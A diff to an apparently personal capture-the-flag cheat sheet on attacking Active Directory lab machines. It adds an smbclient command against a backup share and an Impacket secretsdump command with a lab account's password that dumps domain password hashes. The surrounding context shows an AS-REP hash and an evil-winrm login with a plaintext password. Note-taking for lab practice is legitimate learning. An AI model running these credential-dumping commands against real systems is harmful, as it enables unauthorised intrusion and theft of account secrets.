@@ -60,6 +60,7 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:692e76f70a8772c46ed94e73130460c8$713b0693
 ````
 smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
 smbmap -u svc-admin -p management2005 -H 10.10.248.93
+smbclient -U spookysec.local/svc-admin \\\\10.10.248.93\\backup 
 ````
 
 - Cat out files with `smb`
@@ -82,9 +83,12 @@ evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
 ````
 ### Dump hashes
 - Use `secretsdump.py` with impacket
+- This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer.
 ````
 python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
+python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.248.93
 ````
+![spooky](https://user-images.githubusercontent.com/75596877/130284812-511a8141-5917-4954-8c29-e623c1edce36.png)
 
 
 
